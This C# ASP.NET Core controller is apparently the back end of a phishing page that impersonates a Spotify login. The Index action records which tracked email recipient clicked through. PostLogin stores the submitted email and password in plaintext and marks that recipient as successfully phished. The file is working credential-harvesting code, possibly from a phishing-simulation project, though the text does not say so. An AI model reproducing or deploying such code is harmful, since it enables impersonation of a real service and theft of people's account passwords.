
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using WebApplicationProject.Models;


namespace WebApplicationProject.Controllers
{
    public class SpotifyLoginController : Controller
    {
        private readonly WebDatabaseContext _context;
        private readonly ILogger<SpotifyLoginController> _logger;

        public SpotifyLoginController(WebDatabaseContext context, ILogger<SpotifyLoginController> logger)
        {
            _context = context;
            _logger = logger;
        }
        public IActionResult Index(int EmailId)
        {
            ViewBag.EmailId = EmailId;


            // Veritabanına ekleme işlemi
            var clicked = new ClickedMail
            {
                EmailId = EmailId, // Örnek olarak fname'i Email alanına atadım
                Date = DateTime.Now,// Örnek olarak lname'i Password alanına atadım
                Success = false
            };

            _context.Add(clicked);
            _context.SaveChanges();
            return View("~/Views/SpotifyLogin/SpotifyLogin.cshtml");
        }


        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> PostLogin(string Email, string Password,int EmailId)
        {
            if (!string.IsNullOrEmpty(Email) && !string.IsNullOrEmpty(Password))
            {
                // Veritabanına ekleme işlemi
                var SpotifyLogin = new SpotifyLogin
                {
                    Email = Email, // Örnek olarak fname'i Email alanına atadım
                    Password = Password // Örnek olarak lname'i Password alanına atadım
                };
                var clickedMail = _context.ClickedMails.FirstOrDefault(a => a.EmailId == EmailId);
                clickedMail.Success = true;
                _context.Add(SpotifyLogin);
                _context.Update(clickedMail);
                await _context.SaveChangesAsync();
                return View("Index");
            }

            return BadRequest(); // Hata durumunda bad request dönebilirsiniz
        }

    }
}

